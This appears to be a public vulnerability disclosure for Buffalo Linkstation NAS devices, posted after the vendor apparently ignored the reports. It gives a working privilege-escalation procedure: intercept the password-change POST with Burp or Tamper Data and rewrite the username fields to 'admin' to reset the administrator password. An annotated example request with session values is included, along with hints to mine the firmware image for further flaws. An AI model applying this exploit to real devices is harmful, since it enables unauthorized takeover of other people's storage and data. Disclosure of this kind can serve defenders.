Buffalo doesn't has a security department. They always forwarded me to sales, as they thought the will help me there better. Never received any answer. Tried over some other companies to reach Buffalo, but they are not interested in vulnerabilities.
I waited one year and nothing happend. So here we go...

Buffalo Linkstation Privilege Escalation (Admin Password Reset)

After you cracked the htpassword,  logon with a gained (unprivileged) username and reset the admin password.

To do so just use temperdata or intercept on burp and try to change your password. Enable temper and press the button to change your password.

In the POST request just change the User*Name fields with the name "admin". Make sure to keep the gSSS and gRRR as they are the "session cookies".
Send the changed values and logon with the admin user again.

Example:



   Post Data:
      hiddenPageId[user_add]
      txtUserEditName[admin]   <--- Replace your username with admin here
      txtUserEditOldName[admin]   <--- Replace your username with admin here
      txtUserEditPassword1st[reset]  <-- Password of your favor
      txtUserEditPassword2nd[reset]  <-- Password of your favor
      txtUserEditComment[]
      hiddenUserEditNameOld[admin]   <--- Replace your username with admin here
      txtHelpSearch[]
      gPage[user]
      gMode[setup]
      gType[undefined]
      gKey[undefined]
      gSSS[3ae1c32d69ff7a83594d9daa9c776ad8]
      gRRR[666525125298680621]
      hiddenDummyText[dummy]
   Response Headers:
      Date[Fri, 09 Dec 2011 16:42:13 GMT]
      Server[Apache/1.3.34 (Unix)]
      Cache-Control[no-store, no-cache, must-revalidate, post-check=0, pre-check=0]
      Expires[Thu, 01 Dec 1994 16:00:00 GMT]
      Pragma[no-cache]
      Keep-Alive[timeout=15, max=100]
      Connection[Keep-Alive]
      Transfer-Encoding[chunked]
      Content-Type[text/html; charset=UTF-8]
You can download a firmware Image and unzip it (zip password is all over the internet). There you will find more "features". 
It's just a very bad maintained linux. Bad filepermissions aso..

Buffalo: Your firmware is bad and you should feel bad!
